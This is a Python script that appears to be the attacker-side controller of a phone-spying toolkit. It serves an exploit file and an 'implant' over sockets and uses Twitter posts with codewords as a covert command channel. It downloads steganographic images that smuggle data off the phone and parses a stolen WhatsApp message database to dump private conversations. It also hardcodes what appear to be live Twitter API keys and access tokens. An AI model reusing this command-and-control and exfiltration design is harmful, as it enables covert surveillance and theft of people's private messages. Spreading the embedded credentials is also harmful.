import http.server, socket, sqlite3, tweepy, json, requests

# uses port 12345, ensure later processes use a different port
# TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
def listen_for_phone_and_send_exploit_file(ip_address):
    server_address = (ip_address, 12345)
    print("Localhost waiting on port 12345 for client to connect")
    s = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    s.handle_request()
# 
def send_implant(ip_address):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 6969               
    s.bind((ip_address, port))
    s.listen(1)        
    print("Listening on port 6969 of " + ip_address)        
    count = 0 
    while count < 1:
        conn, addr = s.accept()
        print('Got connection from: ', addr)
        payload = 'HaHahAHa gEt pWnEd LOLOLOL'
        conn.send(payload.encode())
        print("Payload sent to target")
        count += 1
        conn.close() 
        print("Connection closed")

def undo_steganography():
    pass

# Parses WhatsApp message database and stores the messages in a dictionary
def decode_whatsapp_messages():
    print("Starting to decode WhatsApp messages from the SQLite3 Database")
    path_to_msg_database = '../whatsapp-databases/msgstore.db'
    c = connect_to_db(path_to_msg_database)
    c.execute("SELECT * FROM legacy_available_messages_view;")
    messages = c.fetchall()
    
    # message tuple design key = contact values = (message, from_me, timestamp)
    message_dict = {}
    for message in messages:
        if message[1] not in message_dict:
            if message[6] is not None:
                message_dict[message[1]] = [(message[6], message[2], message[7])]
        else:
            message_dict[message[1]].append((message[6], message[2], message[7]))

    for key in message_dict.keys():
        print("Key : {} , Value : {}".format(key,message_dict[key]))


def connect_to_db(filepath):
    conn = sqlite3.connect(filepath)
    c = conn.cursor()
    return c

# Tweets text and optional image_file
def tweet(text_to_tweet, filename = None):
    consumer_key = "Z5kqu3hywa02aW2BYNGeWkkXA"
    consumer_secret = "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4"
    access_token ="1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4"
    access_token_secret ="2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7"
    
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret) 
    auth.set_access_token(access_token, access_token_secret) 
    api = tweepy.API(auth) 
    
    if filename is not None:
        api.update_with_media(filename, status = text_to_tweet)
    else:
        api.update_status(status = text_to_tweet)

# fetches all tweets from @ToastDisciples and searches for tweets from the phone containing the keyword and downloads the necessary images
def fetch_tweets_and_download_encoded_images():
    # codeword = "The toast has been buttered"
    consumer_key = "Z5kqu3hywa02aW2BYNGeWkkXA"
    consumer_secret = "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4"
    access_token ="1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4"
    access_token_secret ="2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7"
    
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret) 
    auth.set_access_token(access_token, access_token_secret) 
    api = tweepy.API(auth) 
    list_of_photo_urls = list()
    for j in range(0,100):
        try:
            tweet = json.loads(json.dumps(api.user_timeline()[j]._json))
            if "The toast is burnt" in str(tweet['text']):
                photo_url = str(tweet['entities']['media'][0]['media_url'])
                list_of_photo_urls.append(photo_url)
        except:
            break

    print(list_of_photo_urls)
    img_count = 0
    for photo_url in list_of_photo_urls:
        photo_file = requests.get(photo_url, stream = True).content
        filename = "encoded_img_{}.jpg".format(img_count)
        print(filename)
        fd = open(filename, 'wb+')
        fd.write(photo_file)
        fd.close()

        img_count += 1

# Command that sends out a datafile to the phone that will be used to encode the WhatsApp database
def burn_the_toast():
    tweet("Burn the toast", filename="toast.jpeg")
    print("The toast has been burned")
    # TODO shutoff server?

def butter_the_toast():
    tweet("Butter the toast")
    print("The toast has been buttered")

if __name__ == "__main__":
    # host = 'localhost'
    # listen_for_phone_and_send_exploit_file(host)
    # send_implant(host)
    # butter_the_toast()
    # decode_whatsapp_messages()
    # burn_the_toast()
    fetch_tweets_and_download_encoded_images()
    # pass
